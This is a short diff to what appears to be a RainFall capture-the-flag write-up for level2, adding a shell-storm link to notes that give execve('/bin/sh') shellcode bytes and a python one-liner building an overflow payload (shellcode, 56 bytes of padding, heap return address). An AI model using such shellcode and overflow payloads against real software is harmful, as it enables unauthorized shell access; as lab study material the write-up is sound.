@@ -35,6 +35,7 @@ How to find 0x804a008:
 Goal: send shellcode + padding to go to offset + return address (where our input is written on the heap)
 
 Shellcode execve(“\bin\sh\, [“/bin/sh”], NULL)
+http://shell-storm.org/shellcode/files/shellcode-219.html
 --> \x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 
 level2@RainFall:~$ python -c 'print "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 56 + "\x08\xa0\x04\x08"' > /tmp/exploit
